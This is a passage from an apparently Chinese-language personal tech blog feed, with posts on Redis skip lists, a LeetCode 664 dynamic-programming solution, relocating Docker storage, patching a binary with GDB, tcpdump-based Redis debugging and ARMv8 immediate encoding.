<li><p>对丢失数据不敏感 —— 仅使用RDB；对丢失数据敏感 —— 综合使用RDB + AOF</p>
</li>
</ul>
<h3><span id="参考资料">参考资料</span></h3><p>【1】《Redis设计与实现》第11章 AOF持久化<br>【2】<a href="https://gitchat.csdn.net/activity/5d5117876f8c3424da08b7af?utm_source=so">Redis 持久化 RDB&#x2F;AOF 详解与实践</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(四)——跳跃表</title>
    <url>/2021/0123193843.html</url>
    <content><![CDATA[<h3><span id="前言">前言</span></h3><p>跳跃表是<strong>一种以O(log N)期望时间支持查找、插入、删除操作的、有序的</strong>数据结构。</p>
<p>Redis使用跳跃表作为<strong>有序集合键</strong>的底层实现之一。</p>
<p>跳表的基本实现原理参考：<a href="http://www.cl.cam.ac.uk/teaching/0506/Algorithms/skiplists.pdf">《Skip lists: a probabilistic alternative to balanced trees》</a></p>
<h3><span id="redis中的跳表实现">Redis中的跳表实现</span></h3><span id="more"></span>

<p>Redis的跳表由zskiplistNode, zskiplist两个数据结构定义。</p>
<p>跳跃表节点的实现如下，由<code>redis.h/zskiplistNode</code>定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ZSETs use a specialized version of Skiplists */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> &#123;</span></span><br><span class="line">    sds ele;							<span class="comment">// 成员对象，唯一</span></span><br><span class="line">    <span class="type">double</span> score;						<span class="comment">// 跳表按分值排序，不唯一</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">backward</span>;</span>		<span class="comment">// 后退指针，用于表尾到表头访问</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistLevel</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">forward</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> span;				<span class="comment">// 跨度</span></span><br><span class="line">    &#125; level[];							<span class="comment">// 层</span></span><br><span class="line">&#125; zskiplistNode;</span><br></pre></td></tr></table></figure>

<p>Redis中跳表和普通跳表区别如下：</p>
<ul>
<li>添加span属性，表示跨度，用于计算排位。</li>
<li>添加backward后退指针，用于表尾到表头访问节点，每次只能后退一个节点。</li>
<li>ele表示SDS对象，必须是唯一的，而普通跳表存储的值可以不唯一。</li>
<li>添加score属性，表示分值，这是Redis跳表排序的依据，score的值允许重复。如score值相同，按ele字典序排列</li>
</ul>
<p>Redis通过zskiplist结构来持有跳表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplist</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">header</span>, *<span class="title">tail</span>;</span>	<span class="comment">// 定位表头、表尾复杂度为O(1)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> length;					<span class="comment">// O(1)获取跳表长度</span></span><br><span class="line">    <span class="type">int</span> level;								<span class="comment">// 层高，注意表头节点的层高不计算在内</span></span><br><span class="line">&#125; zskiplist;</span><br></pre></td></tr></table></figure>

<h3><span id="跳表api">跳表API</span></h3><table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">zskiplist *zslCreate(void);</td>
<td align="left">创建跳表</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">void zslFree(zskiplist *zsl);</td>
<td align="left">释放跳表</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">zskiplistNode *zslInsert(zskiplist *zsl, double score, sds ele);</td>
<td align="left">插入</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">int zslDelete(zskiplist *zsl, double score, sds ele, zskiplistNode **node);</td>
<td align="left">删除跳表</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">unsigned long zslGetRank(zskiplist *zsl, double score, sds ele);</td>
<td align="left">返回给定节点的排位</td>
<td align="left">O(logN)</td>
</tr>
<tr>
<td align="left">zskiplistNode* zslGetElementByRank(zskiplist *zsl, unsigned long rank);</td>
<td align="left">返回指定排位的节点</td>
<td align="left">O(logN)</td>
</tr>
</tbody></table>
<h3><span id="参考资料">参考资料</span></h3><p>《Redis设计与实现》第5章 跳跃表</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 664 奇怪的打印机</title>
    <url>/2021/0815200510.html</url>
    <content><![CDATA[<h3><span id="题目描述">题目描述</span></h3><p><a href="https://leetcode-cn.com/problems/strange-printer">https://leetcode-cn.com/problems/strange-printer</a></p>
<span id="more"></span>

<h3><span id="解题思路">解题思路</span></h3><p>贪心法找不到明显思路，尝试动态规划求解。</p>
<p><strong>1、 先明确动归问题的定义：</strong></p>
<p>记f[i][j]为完成第i个字符到第j个字符的最少打印次数。记字符串s长度为n，则f[0][n-1]即为所求。</p>
<p><strong>2、 将问题拆分成子问题，推导递推方程：</strong></p>
<p>可以将区间[i, j]分解成[i, k]，[k + 1, j] （其中i &lt;&#x3D; k &lt; j)，完成[i, j]打印问题转化为分别完成[i, k], [k + 1, j]两部分打印， k取值一共有j - i种可能，取最小的即可。递推方程：f[i][j] &#x3D; min (k &#x3D; i, k &lt; j) f[i][k] + f[k+1][j]</p>
<p><strong>3 、再考虑边界条件，缩小问题规模：</strong></p>
<ul>
<li><p>对于长度为1的区间，只需打印一次。对所有i都有，f[i][i] &#x3D; 1</p>
</li>
<li><p>对于区间[i, j]，如果第i个字符和第j个字符相等，可以在打印第i个字符时，顺便打印到右侧第j个字符，此时有f[i][j] &#x3D; f[i][j - 1]</p>
</li>
</ul>
<p>最终推导出状态转移方程：<br><img data-src="/2021/0815200510/image1.png"></p>
<h3><span id="代码实现">代码实现</span></h3><p>可以用记忆化搜索，或者自底向上法，代码如下：</p>
<h4><span id="记忆化搜索">记忆化搜索</span></h4><p>套路就是用一个数组，在首次求解子问题时，保存（记忆）这个子问题的解，当再次求解相同子问题时，直接从数组里读取，避免重复递归。代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N_MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> g_strlen;</span><br><span class="line"><span class="type">int</span> dp[N_MAX][N_MAX];						<span class="comment">// 套路: 用一个数组，记录所有子问题的解</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Dfs</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[i][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[i][j - <span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][j - <span class="number">1</span>] = Dfs(s, i, j - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[i][j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> minT = <span class="number">0x3f3f3f3f</span>;						<span class="comment">// s[i] != s[j], 取所有j-i中可能中最小的解</span></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; j; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[i][k] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][k] = Dfs(s, i, k);			<span class="comment">// 如子问题(i, k)已经求解过，直接从数组读取</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[k + <span class="number">1</span>][j] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[k + <span class="number">1</span>][j] = Dfs(s, k + <span class="number">1</span>, j);	<span class="comment">// 如子问题(k + 1, j)已经求解过，直接从数组读取</span></span><br><span class="line">        &#125;</span><br><span class="line">        tmp = dp[i][k] + dp[k + <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; minT) &#123;</span><br><span class="line">            minT = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strangePrinter</span><span class="params">(<span class="type">char</span> * s)</span>&#123;</span><br><span class="line">    g_strlen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_MAX; ++i) &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;					<span class="comment">// 边界条件，长度为1的区间，只需打印一次</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Dfs(s, <span class="number">0</span>, g_strlen - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="自底向上法">自底向上法</span></h4><p>相比记忆化搜索，自底向上法还需要<strong>考虑每个子问题的求解顺序</strong>。根据递推式，这里需从大到小去遍历i, 从小到大遍历j，就可以保证计算f[i][j]时，f[i][k] + f[k + 1][j]都被计算过。</p>
<p><strong>优化点</strong>：s[i] !&#x3D; s[j]时剪枝，只有s[i]和s[k]相等时才计算，进一步压缩空间。代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N_MAX 100</span></span><br><span class="line"><span class="type">int</span> dp[N_MAX][N_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strangePrinter</span><span class="params">(<span class="type">char</span> * s)</span>&#123;</span><br><span class="line">    <span class="type">int</span> str_len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0x3f</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = str_len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; str_len; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; j; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] != s[k]) &#123;			<span class="comment">// 剪枝，只有s[i]和s[k]相等时才计算，进一步压缩空间。</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp = dp[i][k] + dp[k + <span class="number">1</span>][j];</span><br><span class="line">                <span class="keyword">if</span> (tmp &lt; dp[i][j]) &#123;</span><br><span class="line">                    dp[i][j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][str_len - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>LeetCode官方题解：<a href="https://leetcode-cn.com/problems/strange-printer/solution/qi-guai-de-da-yin-ji-by-leetcode-solutio-ogbu/">https://leetcode-cn.com/problems/strange-printer/solution/qi-guai-de-da-yin-ji-by-leetcode-solutio-ogbu/</a></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>修改Docker容器的存储路径</title>
    <url>/2021/1016200721.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>docker拉取的镜像默认存储在根路径(<code>/var/lib/docker</code>)，但根路径存储空间有限。我们可以通过挂载更大的磁盘，将docker数据迁移到挂载磁盘上, 以解决空间不足问题。具体方法如下：</p>
<span id="more"></span>

<h2><span id="方法">方法</span></h2><p>假设挂载磁盘在<code>/usr1</code>，需要将docker数据迁移到路径<code>/usr1</code>下。步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker stop 				# 停止容器</span><br><span class="line">mv /var/lib/docker /usr1/docker 	# 迁移docker数据到新路径，新路径只需保证在/usr1下即可</span><br><span class="line">ln -s /usr1/docker /var/lib/docker  # 创建软连接</span><br><span class="line">service docker start				# 重新启动docker</span><br></pre></td></tr></table></figure>

<p>通过 <code>df -h</code>命令可确认修改生效。</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GDB修改二进制文件</title>
    <url>/2021/1016201159.html</url>
    <content><![CDATA[<h3><span id="背景介绍">背景介绍</span></h3><p>GDB不仅可以用来调试程序，还可以直接修改被调试程序的二进制文件。这种方式相比于改源码重新编译、<code>gdb attach</code>有什么优势呢？考虑以下企业生产环境中的几个调试场景：</p>
<ul>
<li><strong>需要修改的二进制文件是其他领域的，你没有源码和编译工程</strong>，让相关领域出调试对接件比较费时，但你只想临时改一行别人的代码，几分钟内完成验证。</li>
<li><strong>调试环境上，使用gdb attach进程方式有困难</strong>：<ul>
<li>被调试的服务（进程）没有启动断点(可定位性很差)，或者gdb手动拉起的方法非常复杂，等服务正常启动后再attach已经赶不上打断点的时机。</li>
<li>长时间gdb挂住业务进程导致触发丢心跳复位。</li>
<li>你不确定修改的二进制文件同时被几个进程加载，但你诉求很明确，就是直接改文件，对所有进程生效。</li>
</ul>
</li>
</ul>
<p>以下举一个简单的例子，介绍GDB修改程序二进制文件的技巧：</p>
<span id="more"></span>

<h3><span id="问题举例">问题举例</span></h3><p>有一个需修改的二进制文件，C码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> grade = <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">if</span> (grade &lt;= <span class="number">60</span>) &#123;			<span class="comment">// 这里写错了，需要修改成 &gt;= 60及格</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序执行结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gcc main.c -o main &amp;&amp; ./main</span><br><span class="line">fail</span><br></pre></td></tr></table></figure>

<p><font color="red">【问题】</font>这里需要将<code>grade &lt;= 60</code> 要改成 <code>grade &gt; 60</code>。只通过GDB修改二进制文件的方式怎么实现？</p>
<h3><span id="技巧amp解决步骤">技巧&amp;解决步骤</span></h3><p>1、缺省情况下，<code>gdb</code>是以只读方式加载程序的。需要先通过命令行指定加载方式为可写，再通过file命令加载二进制文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) set write on</span><br><span class="line">(gdb) show write</span><br><span class="line">Writing into executable and core files is on.</span><br><span class="line">(gdb) file main</span><br><span class="line">Reading symbols from main...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>

<p>2、结合C码和汇编代码，定位出需修改的汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001135 &lt;+0&gt;:     55                      push   %rbp</span><br><span class="line">   0x0000000000001136 &lt;+1&gt;:     48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   0x0000000000001139 &lt;+4&gt;:     48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">   0x000000000000113d &lt;+8&gt;:     c7 45 fc 41 00 00 00    movl   $0x41,-0x4(%rbp)</span><br><span class="line">   0x0000000000001144 &lt;+15&gt;:    83 7d fc 3c             cmpl   $0x3c,-0x4(%rbp)        # 0x3c = 60, 对应C码：grade &lt;= 60</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7f 0e                   jg     0x1158 &lt;main+35&gt;</span><br><span class="line">   0x000000000000114a &lt;+21&gt;:    48 8d 3d b3 0e 00 00    lea    0xeb3(%rip),%rdi        # 0x2004</span><br><span class="line">   0x0000000000001151 &lt;+28&gt;:    e8 da fe ff ff          callq  0x1030 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001156 &lt;+33&gt;:    eb 0c                   jmp 0x1164 &lt;main+47&gt;</span><br><span class="line">   0x0000000000001158 &lt;+35&gt;:    48 8d 3d aa 0e 00 00    lea    0xeaa(%rip),%rdi        # 0x2009</span><br><span class="line">   0x000000000000115f &lt;+42&gt;:    e8 cc fe ff ff          callq  0x1030 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001164 &lt;+47&gt;:    b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">   0x0000000000001169 &lt;+52&gt;:    c9                      leaveq</span><br><span class="line">   0x000000000000116a &lt;+53&gt;:    c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不难发现， <code>if (grade &lt;= 60)</code> 对应的指令为：<code>0x1148 &lt;+19&gt;: 7f 0e jg 0x1158 &lt;main+35&gt;</code>， 这里只需要将<code>jg</code>指令改<code>jle</code>指令即可。</p>
<p>3、<code>jg</code>, <code>jle</code>指令格式参考<a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-2a-manual.html">指令集手册</a>，如下：<br><img data-src="/2021/1016201159/image1.png"><br>所以只需要将 <code>7f 0e</code> 改成<code>7e 0e</code>即可。</p>
<p>4、修改二进制代码（注意大小端和指令长度），用<code>gdb</code>的<code>set</code>命令修改地址处的内容，方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7f 0e   jg     0x1158 &lt;main+35&gt;</span><br><span class="line">   ...</span><br><span class="line">(gdb) set *(short *)0x1148 = 0xe7e  (指令长度为2个字节，这里是小端序)</span><br><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7e 0e   jle    0x1158 &lt;main+35&gt;</span><br><span class="line">   ...</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>退出<code>gdb</code>, 执行<code>main</code>程序输出pass，说明修改生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./main</span><br><span class="line">pass</span><br></pre></td></tr></table></figure>

<h3><span id="思考">思考</span></h3><p>如果改成70分以上及格，如何修改？如果是aarch64格式的二进制呢？</p>
<p>注意：涉及到立即数的修改，x86_64和aarch64差异很大。aarch64中不同的汇编指令，对立即数的存储方式和表示范围都不同，具体操作时需查询对应的指令集手册。</p>
<h3><span id="参考资料">参考资料</span></h3><p>【1】<a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/">《100个gdb小技巧》</a></p>
<p>【2】<a href="https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile">《ARM Architecture Reference Manual, for ARMv8-A architecture profile》</a></p>
<p>【3】<a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-2a-manual.html">《64-ia-32-architectures-software-developer-vol-2a-manual》</a></p>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>使用wget批量下载指定类型文件</title>
    <url>/2021/1016200952.html</url>
    <content><![CDATA[<p>举例：下载所有的RPM包(文件的扩展名为rpm)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -c -r -np -k -L -p -A rpm http:XXX/</span><br></pre></td></tr></table></figure>

<p>其中各参数意义可通过<code>wget -h</code>查看，如下：</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -h</span><br><span class="line">...</span><br><span class="line">-c,  --continue                  resume getting a partially-downloaded file</span><br><span class="line">-r,  --recursive                 specify recursive download</span><br><span class="line">-np, --no-parent                 don&#x27;t ascend to the parent directory</span><br><span class="line">-k,  --convert-links             make links in downloaded HTML or CSS point to local files</span><br><span class="line">-L,  --relative                  follow relative links only</span><br><span class="line">-p,  --page-requisites           get all images, etc. needed to display HTML page</span><br><span class="line">-A,  --accept=LIST               comma-separated list of accepted extensions</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>wget</category>
      </categories>
      <tags>
        <tag>wget</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis抓包分析案例</title>
    <url>/2021/1106201429.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p><strong>业务背景：</strong> 有一台由多个Docker容器组成的仿真设备环境，1个Docker部署Redis服务端，剩余每个Docker都作为Redis客户端，用于模拟一块单板。</p>
<p><strong>问题：</strong> 仿真设备启动中，<strong>概率出现Redis的某个字符串键被不符合预期地改写成空串</strong>，导致客户端Docker从Redis获取的数据有问题。<strong>需要定位是哪个Docker上的哪个进程改写了Redis数据库。</strong></p>
<span id="more"></span>

<h2><span id="定位思路">定位思路</span></h2><ul>
<li>先尝试排查客户端代码。但此案例中涉及业务代码过多(200w+行代码)，且Redis客户端的形式也很多（有<code>goredis</code>, <code>redis-py</code>, <code>hiredis</code>, <code>redis-cli</code>等）。看来肉眼扫描代码的笨方法不靠谱，而且这种<strong>寄希望于碰运气蒙混过关</strong>的思考方式实在不像是一个程序员。</li>
</ul>
<p>那么既然排查客户端有困难，能不能换个角度思考，比如说从服务端入手？以下给出第二种思路：</p>
<ul>
<li><strong>通过在服务端抓包，得到所有对这个字符串键做set操作的报文，再根据报文中的IP和端口号得到进程ID</strong>。听起来可行，下面举一个简化的案例介绍具体的操作方法。</li>
</ul>
<h2><span id="具体方法">具体方法</span></h2><p>利用tcpdump，在Redis服务端后台抓取对这个字符串键做set操作的报文，再根据报文中的IP和端口号确认进程即可。</p>
<p>如下图所示，使用命令<code>tcpdump -i any port 6379 | grep set | grep [key]</code> ，得到客户端IP是localhost,端口号是44880。 </p>
<p><img data-src="/2021/1106201429/image1.png"></p>
<p>再根据报文中的IP和端口号确认进程号，可以用<code>netstat</code>, <code>ss</code>, <code>lsof</code>等实现。以下仅给出<code>netstat</code>方式，命令：<code>netstat -anltp | grep 端口号</code>，得到进程ID为6748，如下图所示：<br><img data-src="/2021/1106201429/image2.png"></p>
<h4><span id="思考">思考：</span></h4><p>如果我只需要抓取将某个特定字符串键（比如”hello”）写成<strong>某个特定值</strong>（比如写成空串）的报文，怎么做？</p>
<p>除了<code>grep</code>，下面再给出一种方法，利用<strong>tcpdump的根据报文特征过滤</strong>的技巧：</p>
<p>1、使用tcpdump的-X选项查看报文详细内容，重点看Redis请求在TCP报文中是如何存储的：<br><img data-src="/2021/1106201429/image3.png"></p>
<p>可以看出, <code>set hello &quot;world&quot;</code>命令在报文中存储的协议内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3 $3 set $5 hello $5 world</span><br></pre></td></tr></table></figure>

<p>协议内容的解析参考<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a> ， 以下只做简单的解释：</p>
<ul>
<li>*3 表示数组长度为3， 数组元素依次为 [“set” “hello” “world”]</li>
<li>$3 表示字符串 “set” 的长度</li>
<li>第一个 $5 表示字符串 “hello” 的长度。</li>
<li>第二个 $5 表示字符串 “world” 的长度。</li>
</ul>
<p>2、再根据TCP报文内容的特征过滤。此案例中，筛选条件可以是同时匹配 “set” “hello” “$0”(<strong>0匹配键值的长度，用来匹配空串</strong>），可以使用命令<code>tcpdump -i any port 6379 -X and &#39;ip[60:2] == 0x7365&#39; and &#39;ip[69:4] == 0x68656c6c&#39; and &#39;ip[76:2] == 0x2430&#39;</code> 抓取所有将字符串键”hello”写为空串的报文，参考下图：<br><img data-src="/2021/1106201429/image4.png"></p>
<h2><span id="参考资料">参考资料</span></h2><p>【1】<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a></p>
<p>【2】<a href="https://wizardforcel.gitbooks.io/network-basic/content/17.html">网络基本功（十八）：细说tcpdump的妙用（下）</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8 A64汇编中立即数范围问题分析</title>
    <url>/2021/1121202119.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p><strong>ARMv8 A64汇编中，立即数是如何表示的？不同的指令对于立即数的表示有差异吗？</strong></p>
<p>在Stackoverflow上发现类似的讨论：<a href="https://stackoverflow.com/questions/30904718/range-of-immediate-values-in-armv8-a64-assembly">https://stackoverflow.com/questions/30904718/range-of-immediate-values-in-armv8-a64-assembly</a></p>
<span id="more"></span>

<p>问题复现：（环境： <code>Linux debian 4.19.0-10-amd64</code>)</p>
<p>1、编写 <code>hello.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD X12, X10, 0xFEF</span><br><span class="line">AND X12, X10, 0xFEF</span><br></pre></td></tr></table></figure>

<p>如果你是<code>x86_64</code>环境，需先安装<code>aarch64</code>编译工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>2、编译<code>hello.s</code>，发现对于相同立即数<code>0xFEF</code>，<font color="red">AND指令编译出<code>immediate out of range</code>错，但ADD指令编译却不出错，<strong>为什么？？?</strong></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># aarch64-linux-gnu-as hello.s -o hello.o</span><br><span class="line">hello.s: Assembler messages:</span><br><span class="line">hello.s:1: Error: immediate out of range at operand 3 -- `and x12,x10,0xfef&#x27;</span><br></pre></td></tr></table></figure>



<h2><span id="原因分析">原因分析</span></h2><p>查询ARMv8指令集手册(<code>C4.1 A64 instruction set encoding</code>)，先来看下A64 指令集编码格式：<br><img data-src="/2021/1121202119/image1.png"></p>
<p>可以看出<strong>A64指令长度固定为32位，其中op0(占4位)用于区分不同类型的指令，剩下的28位也不可能全用于表示立即数</strong>。因此，和x86&#x2F;x64这种变长指令集对比，A64中立即数表示范围非常有限。</p>
<p>解释这个问题，需要查询指令集手册，对比ADD, AND指令的立即数编码格式差异。</p>
<h3><span id="addimmediate">ADD(immediate)</span></h3><p>ADD指令的编码格式和伪码，可以参考手册 <code>C6.2.4 ADD(immediate)</code>，或下图：<br><img data-src="/2021/1121202119/image2.png"></p>
<ul>
<li><p><code>imm12</code>表示立即数，长度12位，范围0~4095，共4096种取值。</p>
</li>
<li><p>读伪代码可知，<code>sh</code>取值为1时，将<code>imm12</code>左移12位得到立即数。因此又有0 &lt;&lt; 12, 1 &lt;&lt; 12, 2 &lt;&lt; 12, … 4095 &lt;&lt; 12 共4096种取值。前后加起来一共8192种取值。</p>
</li>
<li><p>此例中<font color="red"><strong>0xFEF &#x3D; 4079，显然落在0~4095范围内，所以ADD指令编译不出问题。</strong></font></p>
</li>
</ul>
<p>利用<code>objdump</code>查看<code>ADD X12, X10, 0xFEF</code> 指令的二进制码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># aarch64-linux-gnu-objdump -d hello.o</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   913fbd4c        add     x12, x10, #0xfef</span><br></pre></td></tr></table></figure>

<p> <code>0x913fbd4c</code> &#x3D; <code>1001 0001 0011 1111 1011 1101 0100 1100</code> b， 可以看出这条ADD指令的编码和指令集手册规定的编码格式是一致的。（各字段对应的关系参考上图）</p>
<h3><span id="andimmediate">AND(immediate)</span></h3><p>AND指令的编码格式和伪码参考手册 <code>C6.2.12 AND(immediate)</code>，或下图：<br><img data-src="/2021/1121202119/image3.png"><br><img data-src="/2021/1121202119/image4.png"></p>
<p>AND指令的伪码不是很直观，详细解释参考老外的这篇<a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">文章</a>，非常清楚（参考<code>Logical Immediates</code>小节）</p>
<p><strong>这里给出直观的结论：</strong></p>
<p>AND指令支持的立即数个数为5334个，结果参考：<a href="https://gist.github.com/dinfuehr/51a01ac58c0b23e4de9aac313ed6a06a">full output</a></p>
<p>对于AND指令支持的立即数a，必定能通过如下方式得到：</p>
<ul>
